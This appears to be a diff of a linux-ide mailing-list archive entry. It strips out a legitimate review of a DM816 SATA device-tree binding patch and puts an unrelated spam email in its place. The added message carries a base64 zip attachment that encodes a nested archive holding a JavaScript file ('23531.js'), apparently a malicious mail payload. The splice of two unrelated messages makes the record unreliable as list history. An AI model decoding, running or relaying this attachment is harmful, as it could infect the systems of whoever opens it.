@@ -1,84 +1,113 @@
-From: Sergei Shtylyov <sergei.shtylyov@cogentembedded.com>
-Subject: Re: [PATCH 1/2] dt-bindings: ata: add DT bindings for ahci-dm816 SATA
- controller
-Date: Mon, 13 Mar 2017 20:27:34 +0300
-Message-ID: <61ee23f2-734b-f793-0054-364ce553ae5e@cogentembedded.com>
-References: <1489422982-3461-1-git-send-email-bgolaszewski@baylibre.com>
- <1489422982-3461-2-git-send-email-bgolaszewski@baylibre.com>
- <2d0ede95-86d6-4d52-6cf5-91de35a29145@cogentembedded.com>
- <CAMpxmJUO65yZDSKhL2k1V1fYRFn3psfCtwokbsZAm61UzcdjSg@mail.gmail.com>
+From: <mitch_128@hotmail.com>
+Subject: 33421 linux-ide
+Date: Mon, 13 Mar 2017 18:33:57 -0000
+Message-ID: <148943003776.30068.13364745757462350959@permonline.ru>
+Reply-To: <mitch_128@hotmail.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="63220200.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from mail-lf0-f41.google.com ([209.85.215.41]:36784 "EHLO
-        mail-lf0-f41.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753635AbdCMR1j (ORCPT
-        <rfc822;linux-ide@vger.kernel.org>); Mon, 13 Mar 2017 13:27:39 -0400
-Received: by mail-lf0-f41.google.com with SMTP id y193so66563178lfd.3
-        for <linux-ide@vger.kernel.org>; Mon, 13 Mar 2017 10:27:38 -0700 (PDT)
-In-Reply-To: <CAMpxmJUO65yZDSKhL2k1V1fYRFn3psfCtwokbsZAm61UzcdjSg@mail.gmail.com>
+Received: from dsl-188-17-155-138.permonline.ru ([188.17.155.138]:51417 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1754120AbdCMSeD (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Mon, 13 Mar 2017 14:34:03 -0400
+Content-Disposition: attachment
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: Bartosz Golaszewski <bgolaszewski@baylibre.com>
-Cc: Tejun Heo <tj@kernel.org>, Rob Herring <robh+dt@kernel.org>, Mark Rutland <mark.rutland@arm.com>, Neil Armstrong <narmstrong@baylibre.com>, Michael Turquette <mturquette@baylibre.com>, Kevin Hilman <khilman@baylibre.com>, Patrick Titiano <ptitiano@baylibre.com>, linux-ide@vger.kernel.org, linux-devicetree <devicetree@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>
+To: linux-ide <linux-ide@vger.kernel.org>
 
-On 03/13/2017 08:08 PM, Bartosz Golaszewski wrote:
-
->>> Add DT bindings for the onboard SATA controller present on the DM816x
->>> SoCs.
->>>
->>> Signed-off-by: Bartosz Golaszewski <bgolaszewski@baylibre.com>
->>> ---
->>>  Documentation/devicetree/bindings/ata/ahci-dm816.txt | 20
->>> ++++++++++++++++++++
->>>  1 file changed, 20 insertions(+)
->>>  create mode 100644 Documentation/devicetree/bindings/ata/ahci-dm816.txt
->>>
->>> diff --git a/Documentation/devicetree/bindings/ata/ahci-dm816.txt
->>> b/Documentation/devicetree/bindings/ata/ahci-dm816.txt
->>> new file mode 100644
->>> index 0000000..b87ed5a
->>> --- /dev/null
->>> +++ b/Documentation/devicetree/bindings/ata/ahci-dm816.txt
->>> @@ -0,0 +1,20 @@
->>> +Device tree binding for the TI DM816 AHCI SATA Controller
->>> +---------------------------------------------------------
->>> +
->>> +Required properties:
->>> +  - compatible: must be "ti,dm816-ahci"
->>> +  - reg: physical base address and size of the register region used by
->>> +         the controller (as defined by the AHCI 1.1 standard)
->>> +  - interrupts: interrupt specifier (refer to the interrupt binding)
->>> +  - clocks: clock specifiers (refer to the clock binding); two clocks
->>
->>
->>    There should be a phandle preceding the clock specifier, all new such
->> props are different to the old "interrupts" (which had phandle in a separate
->> "interrupt-parent" prop).
-
-> I'm afraid I don't understand - could you point me to an example?
-
-    Have you read Documentation/devicetree/bindings/clock/clock-bindings.txt, 
-on clock consumers?
-    In fact, your own example below doesn't have clock specifiers, only phandles.
-
->>> +            must be specified: the functional clock and an external
->>> +            reference clock
->>> +
->>> +Example:
->>> +
->>> +       sata: sata@4a140000 {
->>> +               compatible = "ti,dm816-ahci";
->>> +               reg = <0x4a140000 0xffff>;
-[...]
->>> +               interrupts = <16>;
->>> +               clocks = <&sysclk5_ck>, <&sata_refclk>;
->>> +       };
->>>
-
-> Thanks,
-> Bartosz Golaszewski
-
-MBR, Sergei
-
+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
+BgAAAAABAAEAUwAAAJgUAAAAAA==
